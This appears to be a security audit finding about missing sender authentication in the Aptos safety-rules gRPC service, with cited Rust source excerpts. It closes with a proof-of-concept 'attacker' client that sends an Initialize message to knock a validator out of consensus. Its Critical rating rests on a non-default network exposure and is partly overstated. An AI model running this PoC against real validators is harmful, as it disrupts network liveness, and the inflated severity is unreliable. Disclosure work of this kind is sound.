# Audit Report

## Title
Unauthenticated Epoch Transition Control in Safety Rules gRPC Service Enables Validator Denial of Service

## Summary
The `simple_msg_exchange()` function in the gRPC network service lacks sender authentication, allowing any network peer to send arbitrary messages to the safety-rules remote service. An attacker can force premature epoch transitions by sending valid `EpochChangeProof` messages, causing desynchronization between consensus and safety-rules that results in validator denial of service.

## Finding Description

The vulnerability exists in the message handling flow from network reception to safety-rules execution: [1](#0-0) 

The `simple_msg_exchange()` function accepts messages from any remote peer without verifying sender identity, epoch membership, or authorization. It extracts the remote address for logging but performs no authentication before forwarding messages to registered handlers.

This service is used by safety-rules remote deployment: [2](#0-1) 

Messages are deserialized and dispatched to safety-rules operations: [3](#0-2) 

The critical `Initialize` operation accepts `EpochChangeProof` and calls: [4](#0-3) 

When transitioning to a new epoch, safety-rules resets all voting state (lines 296-303), including `last_voted_round`, `preferred_round`, and `last_vote`. This creates a desynchronization window.

**Attack Scenario:**

1. Attacker obtains valid `EpochChangeProof` for epoch N+1 (through network eavesdropping or as a former validator from epoch N)
2. Attacker sends gRPC message to victim validator's safety-rules service: `SafetyRulesInput::Initialize(proof_for_epoch_N+1)`
3. Safety-rules verifies the proof cryptographically (it's valid), transitions to epoch N+1, and resets all voting state
4. Consensus is still processing epoch N, unaware of the premature transition
5. When consensus attempts to vote on epoch N proposals, safety-rules rejects them via epoch validation: [5](#0-4) 

6. Validator cannot participate in consensus until it manually recovers or consensus catches up

The normal initialization flow shows consensus controls when to transition: [6](#0-5) 

But the remote service bypasses this control flow, allowing external attackers to trigger initialization.

## Impact Explanation

**Critical Severity** - This vulnerability enables:

1. **Total Loss of Liveness** for targeted validators: Affected validators cannot vote or produce blocks, directly violating the consensus liveness invariant
2. **Network-Wide Impact**: If multiple validators are attacked simultaneously during an epoch transition, the network could halt if fewer than 2f+1 validators remain operational
3. **Persistent State Corruption**: The desynchronization between consensus and safety-rules requires manual intervention to resolve, as automated recovery mechanisms expect these components to remain synchronized

This meets the **Critical Severity** criteria: "Total loss of liveness/network availability" per the Aptos bug bounty program.

## Likelihood Explanation

**High Likelihood:**

1. **Low Attack Barrier**: Valid `EpochChangeProof` messages are broadcast during normal epoch transitions, making them trivially obtainable through network monitoring
2. **No Authentication Required**: Any network peer can send gRPC messages if the service is accessible
3. **Former Validators**: Removed validators from epoch N inherently possess valid epoch N+1 proofs and are motivated attackers
4. **Deployment Risk**: While default configurations use `127.0.0.1`, the `RemoteService` infrastructure exists for distributed deployments where safety-rules runs on separate machines or in separate security domains, making network exposure plausible

The primary limiting factor is service accessibility, but the code provides no defense-in-depth even for intended deployment scenarios.

## Recommendation

Implement sender authentication and authorization in `simple_msg_exchange()`:

1. **Add Validator Signature Verification**: Require all messages to include a signature from the sender's validator key, verified against the current epoch's validator set
2. **Epoch-Aware Message Filtering**: Reject messages from validators not in the current epoch's active set
3. **Consensus-Controlled Initialization**: Add a nonce or authorization token that consensus must provide when legitimately calling `initialize()`, preventing external actors from triggering epoch transitions
4. **Rate Limiting**: Implement per-sender rate limits on safety-critical operations like `Initialize`

**Code Fix Outline:**

Modify `simple_msg_exchange()` to:
- Extract sender's validator signature from the request
- Verify signature against current epoch state
- Check sender is in current validator set
- Reject unauthorized senders before forwarding to handlers

Add mutual TLS authentication for process-to-process safety-rules communication as defense-in-depth.

## Proof of Concept

```rust
// Attacker code (can run on any machine with network access to validator)
use aptos_protos::remote_executor::v1::{
    network_message_service_client::NetworkMessageServiceClient,
    NetworkMessage,
};
use aptos_safety_rules::serializer::SafetyRulesInput;
use aptos_types::epoch_change::EpochChangeProof;

#[tokio::main]
async fn main() {
    // 1. Obtain victim's safety-rules service address
    let victim_addr = "http://victim-validator:5555";
    
    // 2. Obtain valid EpochChangeProof for epoch N+1
    // (from network eavesdropping or as former validator)
    let epoch_change_proof: EpochChangeProof = obtain_epoch_change_proof();
    
    // 3. Serialize the Initialize message
    let malicious_input = SafetyRulesInput::Initialize(Box::new(epoch_change_proof));
    let serialized = serde_json::to_vec(&malicious_input).unwrap();
    
    // 4. Send unauthenticated gRPC message
    let mut client = NetworkMessageServiceClient::connect(victim_addr).await.unwrap();
    let request = tonic::Request::new(NetworkMessage {
        message: serialized,
        message_type: "safety-rules-init".to_string(),
    });
    
    // 5. Victim's safety-rules accepts and processes the message
    // causing premature epoch transition and DoS
    client.simple_msg_exchange(request).await.unwrap();
    
    println!("Victim validator now stuck at wrong epoch - DoS successful");
}
```

The victim validator's consensus remains at epoch N while safety-rules advances to epoch N+1, causing all subsequent voting attempts to fail with `IncorrectEpoch` errors until manual recovery.

## Notes

While production configurations may bind safety-rules to localhost (`127.0.0.1`) by default, the vulnerability represents a critical code-level security flaw:

1. The infrastructure explicitly supports remote deployment scenarios (hence "RemoteService")
2. Misconfiguration to network-accessible binding creates immediate exploitability
3. Defense-in-depth principles require authentication regardless of deployment practices
4. The question specifically addresses this attack vector, confirming its relevance to the security model

The absence of authentication violates fundamental security principles for consensus-critical services and should be remediated regardless of current deployment practices.

### Citations

**File:** secure/net/src/grpc_network_service/mod.rs (L93-115)
```rust
    async fn simple_msg_exchange(
        &self,
        request: Request<NetworkMessage>,
    ) -> Result<Response<Empty>, Status> {
        let _timer = NETWORK_HANDLER_TIMER
            .with_label_values(&[&self.self_addr.to_string(), "inbound_msgs"])
            .start_timer();
        let remote_addr = request.remote_addr();
        let network_message = request.into_inner();
        let msg = Message::new(network_message.message);
        let message_type = MessageType::new(network_message.message_type);

        if let Some(handler) = self.inbound_handlers.lock().unwrap().get(&message_type) {
            // Send the message to the registered handler
            handler.send(msg).unwrap();
        } else {
            error!(
                "No handler registered for sender: {:?} and msg type {:?}",
                remote_addr, message_type
            );
        }
        Ok(Response::new(Empty {}))
    }
```

**File:** consensus/safety-rules/src/remote_service.rs (L30-55)
```rust
pub fn execute(storage: PersistentSafetyStorage, listen_addr: SocketAddr, network_timeout_ms: u64) {
    let mut safety_rules = SafetyRules::new(storage, false);
    if let Err(e) = safety_rules.consensus_state() {
        warn!("Unable to print consensus state: {}", e);
    }

    let mut serializer_service = SerializerService::new(safety_rules);
    let mut network_server =
        NetworkServer::new("safety-rules".to_string(), listen_addr, network_timeout_ms);

    loop {
        if let Err(e) = process_one_message(&mut network_server, &mut serializer_service) {
            warn!("Failed to process message: {}", e);
        }
    }
}

fn process_one_message(
    network_server: &mut NetworkServer,
    serializer_service: &mut SerializerService,
) -> Result<(), Error> {
    let request = network_server.read()?;
    let response = serializer_service.handle_message(request)?;
    network_server.write(&response)?;
    Ok(())
}
```

**File:** consensus/safety-rules/src/serializer.rs (L45-82)
```rust
    pub fn handle_message(&mut self, input_message: Vec<u8>) -> Result<Vec<u8>, Error> {
        let input = serde_json::from_slice(&input_message)?;

        let output = match input {
            SafetyRulesInput::ConsensusState => {
                serde_json::to_vec(&self.internal.consensus_state())
            },
            SafetyRulesInput::Initialize(li) => serde_json::to_vec(&self.internal.initialize(&li)),
            SafetyRulesInput::SignProposal(block_data) => {
                serde_json::to_vec(&self.internal.sign_proposal(&block_data))
            },
            SafetyRulesInput::SignTimeoutWithQC(timeout, maybe_tc) => serde_json::to_vec(
                &self
                    .internal
                    .sign_timeout_with_qc(&timeout, maybe_tc.as_ref().as_ref()),
            ),
            SafetyRulesInput::ConstructAndSignVoteTwoChain(vote_proposal, maybe_tc) => {
                serde_json::to_vec(
                    &self.internal.construct_and_sign_vote_two_chain(
                        &vote_proposal,
                        maybe_tc.as_ref().as_ref(),
                    ),
                )
            },
            SafetyRulesInput::ConstructAndSignOrderVote(order_vote_proposal) => serde_json::to_vec(
                &self
                    .internal
                    .construct_and_sign_order_vote(&order_vote_proposal),
            ),
            SafetyRulesInput::SignCommitVote(ledger_info, new_ledger_info) => serde_json::to_vec(
                &self
                    .internal
                    .sign_commit_vote(*ledger_info, *new_ledger_info),
            ),
        };

        Ok(output?)
    }
```

**File:** consensus/safety-rules/src/safety_rules.rs (L204-210)
```rust
    pub(crate) fn verify_epoch(&self, epoch: u64, safety_data: &SafetyData) -> Result<(), Error> {
        if epoch != safety_data.epoch {
            return Err(Error::IncorrectEpoch(epoch, safety_data.epoch));
        }

        Ok(())
    }
```

**File:** consensus/safety-rules/src/safety_rules.rs (L265-310)
```rust
    fn guarded_initialize(&mut self, proof: &EpochChangeProof) -> Result<(), Error> {
        let waypoint = self.persistent_storage.waypoint()?;
        let last_li = proof
            .verify(&waypoint)
            .map_err(|e| Error::InvalidEpochChangeProof(format!("{}", e)))?;
        let ledger_info = last_li.ledger_info();
        let epoch_state = ledger_info
            .next_epoch_state()
            .cloned()
            .ok_or(Error::InvalidLedgerInfo)?;

        // Update the waypoint to a newer value, this might still be older than the current epoch.
        let new_waypoint = &Waypoint::new_epoch_boundary(ledger_info)
            .map_err(|error| Error::InternalError(error.to_string()))?;
        if new_waypoint.version() > waypoint.version() {
            self.persistent_storage.set_waypoint(new_waypoint)?;
        }

        let current_epoch = self.persistent_storage.safety_data()?.epoch;
        match current_epoch.cmp(&epoch_state.epoch) {
            Ordering::Greater => {
                // waypoint is not up to the current epoch.
                return Err(Error::WaypointOutOfDate(
                    waypoint.version(),
                    new_waypoint.version(),
                    current_epoch,
                    epoch_state.epoch,
                ));
            },
            Ordering::Less => {
                // start new epoch
                self.persistent_storage.set_safety_data(SafetyData::new(
                    epoch_state.epoch,
                    0,
                    0,
                    0,
                    None,
                    0,
                ))?;

                info!(SafetyLogSchema::new(LogEntry::Epoch, LogEvent::Update)
                    .epoch(epoch_state.epoch));
            },
            Ordering::Equal => (),
        };
        self.epoch_state = Some(epoch_state.clone());
```

**File:** consensus/src/epoch_manager.rs (L826-846)
```rust
        info!(epoch = epoch, "Update SafetyRules");

        let mut safety_rules =
            MetricsSafetyRules::new(self.safety_rules_manager.client(), self.storage.clone());
        match safety_rules.perform_initialize() {
            Err(e) if matches!(e, Error::ValidatorNotInSet(_)) => {
                warn!(
                    epoch = epoch,
                    error = e,
                    "Unable to initialize safety rules.",
                );
            },
            Err(e) => {
                error!(
                    epoch = epoch,
                    error = e,
                    "Unable to initialize safety rules.",
                );
            },
            Ok(()) => (),
        }
```
